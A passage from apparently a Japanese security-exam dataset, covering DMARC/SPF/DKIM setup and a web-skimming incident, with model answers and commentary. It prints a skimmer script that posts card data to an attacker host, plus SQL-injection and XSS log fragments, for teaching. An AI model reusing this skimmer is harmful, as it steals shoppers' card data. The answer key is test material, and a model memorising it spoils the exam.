社が受信するメールの詐称対策（以下，受信対応という）について方針をそれぞれ表 3 と表 4 のとおり作成した。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>項番</th><th>対応方針概要</th></tr></thead><tbody><tr><td>1</td><td>送信するメールのエンベロープ From 及びヘッダーFrom のドメイン名を Z 社ドメイン名とする。</td></tr><tr><td>2</td><td>Z 社ドメイン名のメールを受信した側で SPF による認証及び DKIM による認証に失敗した場合のアクションを DMARC ポリシーとして定義する。</td></tr><tr><td>3</td><td>DMARC ポリシーレコード（以下，DMARC レコードという），SPF レコード及び DKIM キーレコード（以下，DKIM レコードという）を S サービスに登録する。</td></tr><tr><td>4</td><td>送信するメールには，DKIM 署名を付与する。</td></tr><tr><td>5</td><td>DMARC レポートを分析する。</td></tr><tr><td>6</td><td>顧客に，Z 社は送信するメールについて，SPF，DKIM 及び DMARC に対応済みであることを周知する。</td></tr></tbody></table></div><p class=\"fig-caption\">表3　送信対応方針</p></div>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>項番</th><th>対応方針概要</th></tr></thead><tbody><tr><td>1</td><td>受信するメールの宛先メールアドレスのドメイン名は，Z 社ドメイン名とする。</td></tr><tr><td>2</td><td>顧客に，送信するメールについて SPF，DKIM 及び DMARC に対応するように依頼する。</td></tr><tr><td>3</td><td>SPF による認証及び DKIM による認証を行いそのいずれかが成功した場合，DMARC の認証が成功したものと判断し，受信する。</td></tr><tr><td>4</td><td>送信元の DMARC ポリシーに基づき，メールの受信，隔離又は拒否を行う。</td></tr></tbody></table></div><p class=\"fig-caption\">表4　受信対応方針</p></div>\n<p>N 主任と E さんは，これまでの結果を，情報システム部長に報告し，了承を得た。</p>\n<h3>〔メールサービスの機能の検討〕</h3>\n<p>N 主任と E さんは，メールサービスの機能について検討し，メールサービス事業者である U 社のメールサービス（以下，U サービスという）に移行することにした。U サービスの機能の概要を表 5 に示す。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>機能</th><th>概要</th></tr></thead><tbody><tr><td>メール転送</td><td>・インターネットとの間は，SMTP を TLS で暗号化する <span class=\"blank\">c</span> を使用してメールを転送することができる。</td></tr><tr><td>Web メール</td><td>・Web ブラウザを用いてメールを送受信する。</td></tr><tr><td>U サービス管理 Web</td><td>・利用者アカウントの登録や削除を行う。<br>・送信したメールについて DMARC レポートの分析結果を参照することができる。</td></tr></tbody></table></div><p class=\"fig-caption\">表5　U サービスの機能の概要（抜粋）</p></div>\n<h3>〔Z-Web サイト及び U サービスへの移行手順の検討〕</h3>\n<p>E さんは，Z-Web サイト及び U サービスへの移行手順を検討した。検討結果を，図 2 及び図 3 にそれぞれ示す。</p>\n<div class=\"fig\"><div class=\"fig-box\">Web-Step1：A-Web サイトのコンテンツを全て，Z-Web サイトに同一構成で配置する。Z-Web サイトに配置したコンテンツ中の A 社ドメイン名を Z 社ドメイン名に書き換える。<br>Web-Step2：次を 1 年間，実施する。<br>・A-Web サイトへのアクセスを，Z-Web サイトのトップページにリダイレクトする。<br>Web-Step3：A-Web サイトを停止する。A-Web サイト用の DNS レコードは削除する。</div><p class=\"fig-caption\">図2　Z-Web サイトへの移行手順</p></div>\n<div class=\"fig\"><div class=\"fig-box\">Mail-Step1：試行期間として次を 1 か月間，実施する。<br>・総務部及び情報システム部のメンバーだけが，Z 社ドメイン名のメールアドレスを使用する。<br>・送信対応では，DMARC ポリシーを，特定のアクションを要求しないこととし，メールを受信してもらう。<br>・受信対応では，DMARC の認証結果にかかわらず受信する。<br>Mail-Step2：図 1 のメールサーバの利用をやめ，次を 3 か月間，実施する。<br>・Z 社全体が，U サービスを用いて Z 社ドメイン名のメールアドレスを使用する。<br>・Z 社ドメイン名でのメールの利用を顧客に文書で周知するとともに，Z-Web サイトで周知する。<br>・A 社ドメイン名宛てのメールを U サービスで受信する。<br>Mail-Step3：送信対応の DMARC ポリシーを隔離に変更し，その 6 か月後，拒否に変更する。<br>Mail-Step4：A 社ドメイン名でのメールの受信を停止する。メールサーバ用の DNS レコードは削除する。<br>Mail-Step5：問題がないと確認できたら，受信対応で DMARC の処理を行う。</div><p class=\"fig-caption\">図3　U サービスへの移行手順</p></div>\n<p>E さんは，図 2 及び図 3 を N 主任に説明し，了承を得た。</p>\n<h3>〔送信対応の設定内容についての検討〕</h3>\n<p>E さんは，送信対応に用いる SPF レコードを，U サービスから提供された情報に基づいて作成した。</p>\n<p>次に，E さんは，送信対応に用いる DKIM レコードについて検討した。Z 社が U サービスを利用した場合，送信されるメールに付与される DKIM-Signature ヘッダーのタグの内容を表 6 に示す。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>タグ</th><th>内容</th></tr></thead><tbody><tr><td>v</td><td>1</td></tr><tr><td>a</td><td>rsa-sha256</td></tr><tr><td>d</td><td>z-sha.co.jp</td></tr><tr><td>h</td><td>From:To:Subject:Date:Message-ID:MIME-Version</td></tr><tr><td>s</td><td>z2024</td></tr></tbody></table></div><p class=\"fig-caption\">表6　タグの内容（抜粋）</p></div>\n<p>表 6 から，<u>①DKIM レコードの名称として使用する FQDN</u> が決まる。E さんは，U サービスから提供された情報に基づき DKIM レコードを作成した。</p>\n<p>最後に，E さんは，Mail-Step1 の送信対応では DMARC レコードを図 4 のとおりとすることにした。</p>\n<div class=\"fig\"><div class=\"fig-box\"><code>v=DMARC1; p=</code><span class=\"blank\">d</span><code>; rua=mailto:rua-report@z-sha.co.jp</code></div><p class=\"fig-caption\">図4　DMARC レコード</p></div>\n<p>E さんは，設定内容をまとめて N 主任に報告し，了承を得た。</p>\n<h3>〔A 社ドメイン名の契約についての検討〕</h3>\n<p>N 主任と E さんは，A 社ドメイン名使用の契約を継続するか解約するかについて検討した。解約した場合，第三者が A 社ドメイン名を取得することができる。N 主任と E さんは，第三者が A 社ドメイン名を取得した場合の A 社ドメイン名の悪用例を検討し，表 7 のとおりまとめた。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>項目</th><th>悪用の例</th></tr></thead><tbody><tr><td>Web の悪用</td><td>第三者が，A 社ドメイン名を用いて，現在の A-Web サイトと見た目が同じ Web サイトを立ち上げるという悪用が考えられる。さらに，第三者が，コンテンツを細工して Web サイトの見た目を変えずに<u>②顧客に影響を及ぼす攻撃</u>をすることが考えられる。</td></tr><tr><td>メールの送信</td><td>第三者が，メールサーバを立ち上げ，A 社ドメイン名のメールアドレスを送信元メールアドレスとしてメールを送信するという悪用が考えられる。</td></tr><tr><td>メールの受信</td><td>従業員が業務で用いる社外サービスがあり，メールでの連絡先として，A 社ドメイン名のメールアドレスを登録していたとする。もし連絡先の変更を忘れてしまうと，<u>③第三者が，社外サービスから A 社ドメイン名のメールアドレスへのメールを受信し，そのメールを使って続きの攻撃を行う</u>という悪用が考えられる。</td></tr></tbody></table></div><p class=\"fig-caption\">表7　A 社ドメイン名の悪用例</p></div>\n<p>N 主任と E さんは，A 社ドメイン名使用の契約を継続することを情報システム部長に報告し，承認を得た。</p>\n<p>また，A 社ドメイン名については，Mail-Step4 の後で次のとおり，設定することにした。</p>\n<p>・DMARC レコードを設定する。<br>・DMARC の受信対応を行った組織が A 社ドメイン名からのメールを拒否できるようにする。</p>\n<p>そのために，A 社ドメイン名について，SPF レコードを図 5 のように設定する。DKIM レコードは設定しない。</p>\n<div class=\"fig\"><div class=\"fig-box\"><code>v=spf1 </code><span class=\"blank\">e</span></div><p class=\"fig-caption\">図5　SPF レコード</p></div>\n<h3>〔U サービスへの移行の見直し〕</h3>\n<p>Mail-Step1 において，DMARC レポートの分析結果を参照した結果，送信対応には問題がないことが確認できた。</p>\n<p>Mail-Step2 の開始 1 週間後，情報システム部の E さんに営業部の H さんから，図 6 に示すメールの一斉配信をしても問題ないか相談があった。</p>\n<div class=\"fig\"><div class=\"fig-box\">1. 定期的に，Z 社の公式情報の周知のためのメールを一斉配信する。<br>2. 宛先には，社内と社外のメールアドレスが含まれている。<br>3. 一斉配信には，T 社のサービス（以下，T サービスという）を利用する計画であり，T サービスの仕様は次のとおりである。<br>・配信方法<br>　- 宛先メールアドレスは，サービス契約者が登録できる。<br>　- 宛先メールアドレスごとに個別に送信する。<br>・メールのヘッダーの設定<br>　- From は，サービス契約者が所属する組織が保有するドメイン名を用いたメールアドレスだけを設定できる。<br>　- To は，宛先のメールアドレスから一つずつ，T サービスが設定する。<br>　- Subject は，一斉配信の都度，サービス契約者が設定する。<br>　- 他のヘッダーは，T サービスが設定する。</div><p class=\"fig-caption\">図6　メールの一斉配信の説明</p></div>\n<p>E さんから相談を受けた N 主任は，図 6 の一斉配信メールについて，次のとおり E さんに説明した。</p>\n<p>・Mail-Step3 以降で，一斉配信されたメールが届かない場合がある。メールが届くように，Mail-Step2 の期間で，<u>④表 3 の項番 3 での登録内容を見直す</u>必要がある。</p>\n<p>E さんは，見直し案を作成し，N 主任の了承を得てから，H さんに問題ないことを説明した。</p>\n<p>Mail-Step2 の開始 2 週間後，情報システム部に技術部の J さんから，図 7 に示すメーリングリストを新たに利用することが可能か相談があった。</p>\n<div class=\"fig\"><div class=\"fig-box\">1. 使用するメーリングリストは一つである。<br>2. メーリングリストの管理者は，Z 社従業員である。<br>3. 製品に関する情報交換のために，メーリングリストを使用する。<br>4. メーリングリストの配信先となる宛先には，社内及び社外のメールアドレスを登録する（以下，登録されたメールアドレスを登録メンバーという）。<br>5. 登録メンバーから，メーリングリスト宛てにメールを送信できる。<br>6. メールサービス事業者である Y 社のサービス（以下，Y サービスという）を利用する計画であり，Y サービスの仕様は次のとおりである。<br>(1) メーリングリストのメールアドレスは，サービス契約者ごとに割り当てられた Y サービスのメールアドレスである。ドメイン名は Y 社のドメイン名である。<br>(2) Y サービスの管理画面で設定できる項目は(3)〜(6)であり，配信されるメールに反映される。<br>(3) エンベロープ From の設定<br>　・メーリングリストの管理者のメールアドレスを設定する。<br>(4) ヘッダーFrom の設定<br>　・次のいずれかを選択する。<br>　　ヘッダーFrom 設定 1：メーリングリスト宛てに送信されたメールのヘッダーFrom を使用する。<br>　　ヘッダーFrom 設定 2：メーリングリストのメールアドレスを使用する。<br>(5) Subject の設定<br>　・次のいずれかを選択する。<br>　　Subject 設定 1：メーリングリスト宛てに送信されたメールの Subject を使用する。<br>　　Subject 設定 2：メーリングリスト宛てに送信されたメールの Subject にメールの通番情報を付加する。<br>(6) Reply-To の設定<br>　・メーリングリストのメールアドレスを設定する。<br>(7) ヘッダーFrom，Subject 及び Reply-To 以外のヘッダー<br>　・メーリングリスト宛てに送信したメールのヘッダーを引き継ぐ。<br>(8) Authenticated Received Chain<sup>注1)</sup>（ARC）について<br>　・ARC には，対応していない。</div><p class=\"fig-note\">注1)　メールが転送される場合でも，メールの認証結果を確認できるようにする仕組みとして，RFC 8617 に定義されている。</p><p class=\"fig-caption\">図7　メーリングリストの説明</p></div>\n<p>N 主任は，E さんに図 8 に示すとおり説明した。</p>\n<div class=\"fig\"><div class=\"fig-box\">・Mail-Step3 以降に Z 社の従業員が送信したメールについて<br>　- ヘッダーFrom 設定 1 と Subject 設定 1 の組合せでは，不達の問題は起きない。<br>　- ヘッダーFrom 設定 1 と Subject 設定 2 の組合せでは，<u>⑤SPF による認証及び DKIM による認証の両方に失敗することによって不達の問題が発生することがある</u>。<br>　- ヘッダーFrom 設定 2 については，Z 社の従業員が送信したメールであるかどうかの判定ができないので，用いるべきではない。<br>・Mail-Step3 以降に Z 社の従業員以外が送信したメールについて<br>（省略）</div><p class=\"fig-caption\">図8　N 主任の説明</p></div>\n<p>N 主任と E さんは，J さんには，ヘッダーFrom 設定 1 と Subject 設定 1 の組合せを用いるよう説明した。</p>\n<p>その後，Z-Web サイト及び U サービスへの移行は，順調に進み，完了した。</p>\n",
+   "items": [
+    {
+     "id": "1-1",
+     "label": "設問1 (1) a",
+     "prompt": "〔情報システムの現状〕について。表 1 中及び表 2 中の <span class=\"blank\">a</span> に入れる適切な字句を答えよ。",
+     "answers": [
+      "A 社ドメイン名"
+     ]
+    },
+    {
+     "id": "1-2",
+     "label": "設問1 (2) b",
+     "prompt": "表 2 中の <span class=\"blank\">b</span> に入れる適切な字句を答えよ。",
+     "answers": [
+      "全て"
+     ]
+    },
+    {
+     "id": "2",
+     "label": "設問2 c",
+     "prompt": "表 5 中の <span class=\"blank\">c</span> に入れる適切な字句を英字 10 字以内で答えよ。",
+     "answers": [
+      "SMTPS"
+     ]
+    },
+    {
+     "id": "3-1",
+     "label": "設問3 (1)",
+     "prompt": "〔送信対応の設定内容についての検討〕について。本文中の下線①の FQDN を解答群の中から選び，記号で答えよ。<br>解答群：<br>ア rsa-sha256._dkim.z-sha.co.jp<br>イ rsa-sha256._domainkey.z-sha.co.jp<br>ウ z2024._dkim.z-sha.co.jp<br>エ z2024._domainkey.z-sha.co.jp<br>オ z2024.z-sha.co.jp",
+     "answers": [
+      "エ（z2024._domainkey.z-sha.co.jp）"
+     ]
+    },
+    {
+     "id": "3-2",
+     "label": "設問3 (2) d",
+     "prompt": "図 4 中の <span class=\"blank\">d</span> に入れる適切な字句を解答群の中から選び，記号で答えよ。<br>解答群：ア accept　イ none　ウ quarantine　エ receive　オ reject",
+     "answers": [
+      "イ（none）"
+     ]
+    },
+    {
+     "id": "4-1",
+     "label": "設問4 (1)",
+     "prompt": "〔A 社ドメイン名の契約についての検討〕について。表 7 中の下線②について，攻撃の方法を具体的に答えよ。",
+     "answers": [
+      "ソフトウェア修正プログラムに見せかけたマルウェアをダウンロードさせる。"
+     ]
+    },
+    {
+     "id": "4-2a",
+     "label": "設問4 (2) メール",
+     "prompt": "〔A 社ドメイン名の契約についての検討〕について。表 7 中の下線③について，受信するメールの内容及び続きの攻撃の例を具体的に答えよ。",
+     "answers": [
+      "社外サービスのパスワード再設定画面の URL が書かれたメール"
+     ]
+    },
+    {
+     "id": "4-2b",
+     "label": "設問4 (2) 攻撃",
+     "prompt": "〔A 社ドメイン名の契約についての検討〕について。表 7 中の下線③について，受信するメールの内容及び続きの攻撃の例を具体的に答えよ。",
+     "answers": [
+      "任意のパスワードを設定し，アカウントを乗っ取る。"
+     ]
+    },
+    {
+     "id": "4-3",
+     "label": "設問4 (3) e",
+     "prompt": "図 5 中の <span class=\"blank\">e</span> に入れる適切な字句を解答群の中から選び，記号で答えよ。<br>解答群：ア -all　イ ?all　ウ block　エ deny　オ refuse",
+     "answers": [
+      "ア（-all）"
+     ]
+    },
+    {
+     "id": "5-1",
+     "label": "設問5 (1)",
+     "prompt": "〔U サービスへの移行の見直し〕について。本文中の下線④について，見直しの内容を具体的に答えよ。",
+     "answers": [
+      "SPF レコードに，T サービスのメール送信元 IP アドレスを追加する。"
+     ]
+    },
+    {
+     "id": "5-2a",
+     "label": "設問5 (2) SPF",
+     "prompt": "〔U サービスへの移行の見直し〕について。図 8 中の下線⑤について，SPF による認証に失敗する理由及び DKIM による認証に失敗する理由をそれぞれ，S サービスへの登録内容と Y サービスの仕様を含めて，具体的に答えよ。",
+     "answers": [
+      "SPF レコードに Y サービスの情報が登録されていないのに，メールが Y サービスから送られる。"
+     ]
+    },
+    {
+     "id": "5-2b",
+     "label": "設問5 (2) DKIM",
+     "prompt": "〔U サービスへの移行の見直し〕について。図 8 中の下線⑤について，SPF による認証に失敗する理由及び DKIM による認証に失敗する理由をそれぞれ，S サービスへの登録内容と Y サービスの仕様を含めて，具体的に答えよ。",
+     "answers": [
+      "DKIM レコードの h タグに Subject が含まれているのに，Y サービスでメールの Subject が変わる。"
+     ]
+    }
+   ],
+   "commentary": "問 2 では，電子メール（以下，メールという）のドメイン名の変更を機にした新たなメールサービスの導入を題材に，メールサービスの設定，変更前のドメイン名の契約維持の要否，及び DMARC の導入について出題した。全体として正答率は平均的であった。\n設問 2 は，正答率が平均的であった。“S/MIME”といった解答が散見された。“S/MIME”は，MIME の仕組みを使ったメール本文及び添付ファイルの暗号化の方式であって，SMTP を暗号化する方式ではない。メールに関連する暗号技術及び通信プロトコルについて，よく理解してほしい。\n設問 3(1)は，正答率が低かった。DKIM の仕組み及び表 6 のタグの内容を用いれば，正答を導くことができる。DKIM の仕組みについて，よく理解してほしい。\n設問 5(2)SPF は，正答率がやや低かった。メールの Subject に通番情報を付加するといった解答が散見された。SPF では，Subject を判定対象としていない。SPF の仕組みについて，よく理解してほしい。\n設問 5(2)DKIM は，正答率が平均的であった。表 6 の h タグにおいて，Subject を判定対象として含んでいる。メールの Subject に通番情報を付加すると，DKIM による認証が失敗する。DKIM の仕組みと，メーリングリストの設定を理解した上で，解答してほしい。"
+  },
+  {
+   "no": 3,
+   "title": "クレジットカード情報の漏えい",
+   "pages": "p.22〜29",
+   "aim": "Web サイトの改ざんが発生したときには，悪用された脆弱性，影響を受けた利用者及びデータの範囲などを特定し，再発防止策を講じる必要がある。本問では，EC サイトの Web スキミングによるクレジットカード情報の漏えいを題材として，HTML の仕様，ECMAScript の仕様，Web サーバの動作及び Web アプリケーションプログラムの脆弱性に関する知識及び影響を受けた利用者を特定する能力を問う。",
+   "body": "\n<p>J 社は，インテリアを扱う EC サイト（以下，J 社の EC サイトを J 社 EC サイトという）を運営する，従業員 200 名の会社である。</p>\n<h3>〔J 社 EC サイトの構成〕</h3>\n<p>J 社 EC サイトは，Web アプリケーションプログラム（以下，J 社 EC サイトの Web アプリケーションプログラムを Web アプリ P という），Web サーバ及び DB サーバで構成されている。J 社は Web アプリ P の開発及び保守，並びに Web サーバ及び DB サーバの構築，管理及び保守を V 社に委託している。Web アプリ P のアプリケーションログには，アクセス日時，画面名，アカウント名，アクセス元 IP アドレスなどが記録される。</p>\n<p>J 社 EC サイトでの支払方法は，クレジットカード決済及び銀行振込に対応している。</p>\n<p>クレジットカード決済は D 社の決済代行サービスを利用している。D 社の提供する決済用 ECMAScript プログラムを使用したトークン型決済を用いて，クレジットカード情報の非保持化を実現している。商品購入に関する画面の概要を表 1 に，画面遷移を図 1 に示す。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>画面名</th><th>説明</th></tr></thead><tbody><tr><td>ショッピングカート</td><td>購入対象としてショッピングカートに登録された商品を表示する。ショッピングカートに登録した商品を購入する場合は，“購入”ボタンを押す。配送先・支払方法選択画面に遷移する。</td></tr><tr><td>配送先・支払方法選択</td><td>配送先住所<sup>注1)</sup>と支払方法を選択する。配送先住所を選択し，クレジットカード決済と銀行振込のいずれかの支払方法を選択して，“次へ”ボタンを押す。支払手続画面に遷移する。</td></tr><tr><td>支払手続</td><td>支払方法に応じて，表示される内容及び入力する内容が異なる。クレジットカード決済の場合は，クレジットカード情報の入力フォームが表示される。D 社の提供する決済用 ECMAScript プログラムによって，決済が行われる。銀行振込の場合は，振込先の口座情報が表示される。</td></tr><tr><td>注文完了</td><td>ショッピングカート→配送先・支払方法選択→支払手続が完了した場合に表示される。この後に注文確認の電子メール<sup>注2)</sup>が商品を購入した利用者に送信される。</td></tr></tbody></table></div><p class=\"fig-caption\">表1　商品購入に関する画面の概要（抜粋）</p></div>\n<p class=\"fig-note\">注1)　利用者情報としてあらかじめ配送先住所を登録しておく。配送先住所は複数登録できる。登録済みの配送先住所はプルダウンで選択できる。<br>注2)　利用者情報としてあらかじめ電子メールアドレスを登録しておく。</p>\n<div class=\"fig\"><img src=\"data/img/r06a_pm3_fig1.png\" alt=\"/cart ショッピングカート（購入）→ /shopping 配送先・支払方法選択（配送先プルダウン、お支払方法：クレジットカード決済・銀行振込のラジオボタン、次へ）→ /payment 支払手続（ご利用金額、カード番号、有効期限、名義、セキュリティコード、注文）→ /confirm 注文完了\" loading=\"lazy\"><p class=\"fig-caption\">図1　商品購入に関する画面遷移</p></div>\n<p class=\"fig-note\">注記1　/cart などは URL のパス名を示す。<br>注記2　/cart 以外へのアクセスは J 社 EC サイトへのログインが必要である。<br>注記3　/cart 以外は直接アクセスするとトップページにリダイレクトされる。</p>\n<h3>〔利用者からの問合せ〕</h3>\n<p>6 月 11 日から 12 日にかけて，複数の利用者から，クレジットカード情報を入力する画面が 2 回表示されるという問合せ，及び支払方法が勝手にクレジットカード決済になってしまうという問合せがあった。J 社 EC サイト担当者の G さんは，偽のクレジットカード情報入力フォーム（以下，偽フォームという）が表示された可能性があると考え，上司の R さんに報告した上で，Web サーバの 6 月 11 日のアクセスログに不審な点がないかどうかを確認した。Web サーバの 6 月 11 日のアクセスログのうち，不審と思われるアクセスを抽出したものを表 2 に示す。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>行番号</th><th>メソッド</th><th>リクエスト URI</th><th>ステータスコード</th></tr></thead><tbody><tr><td>1</td><td>GET</td><td>/products/list?page=4&amp;category_id=1</td><td>200</td></tr><tr><td>2</td><td>GET</td><td>/login?id=hoge&amp;pw='UNION select 1 FROM…</td><td>200</td></tr><tr><td>3</td><td>POST</td><td>/mypage/userinfo</td><td>200</td></tr><tr><td>4</td><td>POST</td><td>/mypage/change</td><td>200</td></tr><tr><td>5</td><td>GET</td><td>/cart?add=\"&gt;&lt;script&gt;document.getElementById(…</td><td>200</td></tr><tr><td>6</td><td>GET</td><td>/products/list?category=green's sofa</td><td>200</td></tr><tr><td>7</td><td>PUT</td><td>/shopping</td><td>405</td></tr><tr><td>8</td><td>GET</td><td>/cart</td><td>200</td></tr><tr><td>9</td><td>POST</td><td>/payment</td><td>200</td></tr><tr><td>10</td><td>PUT</td><td>/ec-j/layout/js/customize.js</td><td>204</td></tr></tbody></table></div><p class=\"fig-caption\">表2　Web サーバのアクセスログ</p></div>\n<p class=\"fig-note\">注記1　アクセス日時，User-Agent，リファラなどは省略している。<br>注記2　リクエスト URI 中の“…”は省略を表す。<br>注記3　リクエスト URI は，URL デコード済みである。</p>\n<p>次は，アクセスログに関する R さんと G さんの会話である。</p>\n<p><b>R さん</b>：偽フォームの表示が可能な攻撃の痕跡はあったのか。<br>\n<b>G さん</b>：表 2 の <span class=\"blank\">a</span> 行目が <span class=\"blank\">b</span> 脆弱性を狙った攻撃だと思いますが，そういった攻撃であれば偽フォームの表示が可能です。さらに <span class=\"blank\">b</span> 脆弱性が <span class=\"blank\">c</span> 型であれば，1 回の攻撃で多数の利用者に対して偽フォームの表示が可能です。<br>\n<b>R さん</b>：それとは別に，表 2 の <span class=\"blank\">d</span> 行目は <span class=\"blank\">e</span> 脆弱性を狙った攻撃の痕跡だと思うが，仮にその脆弱性が存在した場合に，偽フォームの表示は可能なのか。<br>\n<b>G さん</b>：Web アプリ P が，DB サーバに格納している情報を基に Web ページを動的に生成していれば可能かもしれません。<br>\n<b>R さん</b>：承知した。その他，表 2 の 10 行目の PUT メソッドでファイルが更新されている点も気になる。以前，セキュリティベンダーに依頼して報告を受けている Web アプリ P の脆弱性診断レポートに，<span class=\"blank\">b</span> 脆弱性及び <span class=\"blank\">e</span> 脆弱性の指摘があるかどうかと，PUT メソッドによる更新は V 社によるものかどうか，V 社に至急確認してほしい。</p>\n<p>G さんは，6 月 13 日に V 社に問い合わせた。また，最新バージョンの Web アプリ P に対する脆弱性診断レポートを確認したところ，脆弱性の指摘はなかった。</p>\n<h3>〔偽フォーム表示の原因の調査と対策〕</h3>\n<p>6 月 14 日に V 社から連絡があり，PUT メソッドによるファイル更新は V 社によるものではなかったことが判明した。Web サーバに設置していた ECMAScript ファイルの一つ customize.js が攻撃者のファイル（以下，ファイル K という）に置き換えられていた。customize.js は，通常時は空のファイルであり，Web サイトのデザインを一時的に変更する際に利用するものである。<u>①配送先・支払方法選択画面でファイル K が読み込まれており，HTML の一部が書き換えられていた</u>。この書換えによって，<u>②配送先・支払方法選択画面から支払手続画面への画面遷移の処理で利用しているパラメータの値が変更され</u>，支払方法がクレジットカード決済に固定されていた。ファイル K を整形したものを図 2 に，配送先・支払方法選択画面の HTML ソースを図 3 に示す。</p>\n<div class=\"fig\"><pre class=\"fig-code\">1: if (location.pathname == '/shopping'){\n2:   let elem = document.querySelector(\"#shopping-form &gt; div &gt; div &gt; div.order_payment &gt; div.radio\");\n3:   elem.innerHTML='&lt;p&gt;カード番号&lt;input type=\"text\" id=\"get_number\" /&gt;&lt;/p&gt;&lt;p&gt;有効期限&lt;input type=\"text\" id=\"get_exp_month\" /&gt;月/&lt;input type=\"text\" id=\"get_exp_year\" /&gt;年&lt;/p&gt;&lt;p&gt;名義&lt;input type=\"text\" id=\"get_name\" /&gt;&lt;/p&gt;&lt;p&gt;セキュリティコード&lt;input type=\"text\" id=\"get_code\" /&gt;&lt;/p&gt;&lt;input type=\"hidden\" name=\"order[Payment]\" value=\"1\" /&gt;';\n4:   let form = document.getElementById('shopping-form');\n5:   form.addEventListener('submit', function() {\n6:     const req = new XMLHttpRequest();\n7:     let number = document.getElementById('get_number').value;\n8:     let exp_month = document.getElementById('get_exp_month').value;\n9:     let exp_year = document.getElementById('get_exp_year').value;\n10:    let name = document.getElementById('get_name').value;\n11:    let code = document.getElementById('get_code').value;\n12:    let url = 'https://i-sha.com/?num=' + number + '&amp;exp=' + exp_month + '%2F' + exp_year + '&amp;name=' + name + '&amp;code=' + code;\n13:    req.open(\"GET\", url);\n14:    req.send();\n15:  });\n16: }</pre><p class=\"fig-caption\">図2　整形後のファイル K</p></div>\n<div class=\"fig\"><pre class=\"fig-code\">（省略）\n&lt;form id=\"shopping-form\" method=\"post\" action=\"/payment\"&gt;\n&lt;div class=\"order\"&gt;\n&lt;div class=\"order_detail\"&gt;\n（省略）\n&lt;div class=\"order_payment\"&gt;\n&lt;div&gt;&lt;h2&gt;お支払方法&lt;/h2&gt;&lt;/div&gt;\n&lt;div class=\"radio\"&gt;\n&lt;input type=\"radio\" id=\"Payment_1\" name=\"order[Payment]\" required data-trigger=\"change\" value=\"1\" checked /&gt;\n&lt;label for=\"Payment_1\"&gt;&lt;span&gt;クレジットカード決済&lt;/span&gt;&lt;/label&gt;\n&lt;input type=\"radio\" id=\"Payment_2\" name=\"order[Payment]\" required data-trigger=\"change\" value=\"2\" /&gt;\n&lt;label for=\"Payment_2\"&gt;&lt;span&gt;銀行振込&lt;/span&gt;&lt;/label&gt;\n&lt;/div&gt;\n（省略）\n&lt;button type=\"submit\" class=\"blockBtn\"&gt;次へ&lt;/button&gt;\n&lt;/form&gt;\n（省略）\n  &lt;script src=\"/ec-j/layout/js/customize.js\"&gt;&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;</pre><p class=\"fig-note\">注記　CSRF 対策のトークンの記述は省略している。</p><p class=\"fig-caption\">図3　配送先・支払方法選択画面の HTML ソース</p></div>\n<p>その後，6 月 16 日に V 社から，customize.js の置換えについての調査結果及び対処の報告があった。その報告を図 4 に示す。</p>\n<div class=\"fig\"><div class=\"fig-box\">・V 社で PUT メソッドに関する設定変更を 6 月 8 日 18 時 12 分に実施した。<br>　Web サーバのファイル更新は，事前申請をした後に Web サーバに SSH で接続して行う運用であるが，V 社の作業者が SSH で接続せずにファイルを更新できるように，/ec-j/layout/js/配下だけ，未認証でも PUT メソッドでファイルの更新を許可する設定にした。<br>・V 社で 6 月 9 日 9 時 00 分から 10 時 42 分の間に J 社 EC サイトのメンテナンスを実施した。<br>　メンテナンスでは PUT メソッドを使用した。<br>・customize.js の置換えは 6 月 11 日 13 時 12 分に行われた。<br>　PUT メソッドを使って，ファイル K に置き換えられた。<br>　Web アプリ P の仕様上，customize.js の読み込みは無効にできない。<br>　customize.js 以外のファイルの置換えはなかった。<br>・6 月 16 日 8 時 5 分に PUT メソッドによるファイルの更新を禁止する設定にし，customize.js を置換え前のファイルに戻した。<br>・6 月 16 日 9 時 00 分に Cache Busting を実施した。<br>　ファイル K のキャッシュ破棄と customize.js の再読込みの二つを行わせるための変更をした。</div><p class=\"fig-caption\">図4　V 社からの調査結果及び対処の報告</p></div>\n<h3>〔クレジットカード情報の漏えいの調査と対策〕</h3>\n<p>本件に関する利用者からの問合せは，6 月 15 日 21 時 45 分が最後であり，合計 32 件あった。次は，customize.js の置換えによる影響の調査に関する R さんと G さんの会話である。</p>\n<p><b>R さん</b>：クレジットカード情報入力フォームが 2 回表示されたのは，customize.js が置き換えられていた影響で偽フォームが表示されたからだったのか。<br>\n<b>G さん</b>：そのとおりです。2 回目に表示されたクレジットカード情報入力フォームにクレジットカード情報を入力し，送信している場合だけ，当社で注文が完了していました。<br>\n<b>R さん</b>：ダミーのクレジットカード情報を設定して図 2 で GET リクエストが送られる先の URL にアクセスしたところ，404 のステータスコードが返ってきた。もし，攻撃者の Web サーバが適切なステータスコードを返しているとしたら，この結果から，攻撃者の Web サーバに Web アプリケーションプログラムが用意されておらず，クレジットカード情報は盗まれていないと判断してよいか。<br>\n<b>G さん</b>：<u>③利用者が改ざんされた画面に入力して，クレジットカード情報が送信されてしまったときに，攻撃者の Web サーバで Web アプリケーションプログラムを用意していなくても，攻撃者は利用者の入力したクレジットカード情報を取得する方法があります</u>。クレジットカード情報は盗まれたと判断すべきです。<br>\n<b>R さん</b>：クレジットカード情報の漏えいの可能性について利用者に案内を出したい。攻撃者の Web サーバにクレジットカード情報を送信した利用者を特定してほしい。攻撃者の Web サーバに情報を送信してしまった利用者は漏れなく特定したいが，送信していない利用者はできるだけ含めたくない。そのためには，どのようにすればよいのか。<br>\n<b>G さん</b>：V 社の報告から，customize.js の置換えの影響のあった期間は 6 月 11 日 13 時 12 分から 6 月 16 日 9 時 00 分と考えられます。攻撃者の Web サーバにクレジットカード情報を送信する直前までの操作をした利用者を被害者候補として特定するために，その期間のアプリケーションログから <span class=\"blank\">f</span> を抽出したいと思います。<br>\n<b>R さん</b>：それで抽出してくれ。</p>\n<p>その後，G 